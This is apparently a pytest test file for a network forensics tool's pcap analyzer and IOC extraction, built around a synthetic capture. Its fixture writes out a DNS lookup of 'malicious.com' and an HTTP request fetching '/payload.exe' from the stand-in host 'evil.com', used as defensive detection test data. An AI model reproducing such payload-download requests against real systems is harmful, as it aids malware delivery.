from pathlib import Path

import pytest
from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, wrpcap  # type: ignore
from scapy.packet import Raw

from app.network.analyzers.orchestrator import network_orchestrator
from app.network.services.ioc_integration import network_ioc_integration


@pytest.fixture
def sample_pcap(tmp_path: Path) -> Path:
    pcap_file = tmp_path / "test.pcap"
    p1 = Ether()/IP(src="192.168.1.10", dst="8.8.8.8")/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname="malicious.com"))
    http_req = b"GET /payload.exe HTTP/1.1\r\nHost: evil.com\r\n\r\n"
    p2 = Ether()/IP(src="192.168.1.10", dst="10.0.0.5")/TCP(sport=5555, dport=80, flags="S")/Raw(load=http_req)
    wrpcap(str(pcap_file), [p1, p2])
    return pcap_file

def test_pcap_orchestrator(sample_pcap: Path) -> None:
    stats = network_orchestrator.analyze_pcap(sample_pcap)
    assert stats.total_packets == 2
    assert "DNS" in stats.protocols
    assert len(stats.dns_queries) == 1
    assert "malicious.com" in stats.dns_queries[0].query
    assert len(stats.http_requests) == 1
    assert stats.http_requests[0].host == "evil.com"
    assert len(stats.conversations) == 2

def test_ioc_integration(sample_pcap: Path) -> None:
    stats = network_orchestrator.analyze_pcap(sample_pcap)
    iocs = network_ioc_integration.extract_from_stats(stats, case_id="test")
    values = [ioc.value for ioc in iocs]
    assert "192.168.1.10" in values
    assert any("malicious" in v for v in values)
